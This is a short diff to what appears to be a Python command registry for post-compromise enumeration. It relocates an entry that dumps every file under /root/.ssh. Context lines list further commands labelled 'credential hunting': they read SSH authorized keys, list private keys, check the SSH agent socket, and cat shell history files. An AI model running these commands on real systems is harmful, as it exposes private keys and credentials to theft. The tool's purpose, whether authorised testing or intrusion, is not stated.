@@ -943,7 +943,6 @@ class CommandRegistry:
             "ssh_authorized_keys": ("cat", "$HOME/.ssh/authorized_keys"),
             "ssh_private_keys": ("ls", "-la", "~/.ssh/"),
             "ssh_agent_check": ("echo", "$SSH_AUTH_SOCK"),
-            "file_contents_ssh": ("bash", "-c", "find /root/.ssh -type f -exec sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"' \\;"),
             # ============ CREDENTIAL HUNTING ============
             "bash_history": ("cat", "~/.bash_history"),
             "zsh_history": ("cat", "~/.zsh_history"),
@@ -999,7 +998,7 @@ class CommandRegistry:
             "file-ls-root": ("ls", "-la", "/root"),
             "file-ls-web": ("ls", "-la", "/var/www"),
             "file_contents_app": ("bash", "-c", "find /app -type f -exec sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"' \\;"),
-            
+            "file_contents_ssh": ("bash", "-c", "find /root/.ssh -type f -exec sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"' \\;"),
 
         }
         return commands
